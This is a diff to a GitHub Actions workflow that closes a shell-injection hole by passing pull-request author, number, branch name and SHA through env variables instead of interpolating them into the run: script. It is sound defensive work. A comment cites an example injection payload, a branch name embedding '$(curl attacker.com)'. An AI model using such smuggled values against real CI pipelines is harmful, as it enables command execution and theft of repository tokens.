@@ -693,6 +693,13 @@ jobs:
         continue-on-error: true
         env:
           GH_TOKEN: ${{ steps.bot-token.outputs.token }}
+          # User-controlled values MUST go through env: to prevent shell injection.
+          # Branch names like feat/$(curl attacker.com) are safe as env vars but
+          # dangerous when interpolated directly into run: shell commands.
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
+          COMMIT_SHA: ${{ github.sha }}
         run: |
           python scripts/security/create-finding-issues.py \
             --sast-results sast-results/ \
@@ -701,10 +708,10 @@ jobs:
             --run-id "${{ github.run_id }}" \
             --run-url "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
             --repo "${{ github.repository }}" \
-            --pr-author "${{ github.event.pull_request.user.login }}" \
-            --pr-number "${{ github.event.pull_request.number }}" \
-            --branch "${{ github.head_ref || github.ref_name }}" \
-            --sha "${{ github.sha }}"
+            --pr-author "$PR_AUTHOR" \
+            --pr-number "$PR_NUMBER" \
+            --branch "$BRANCH_NAME" \
+            --sha "$COMMIT_SHA"
 
       - name: Post security scan results to PR
         if: always() && github.event_name == 'pull_request'
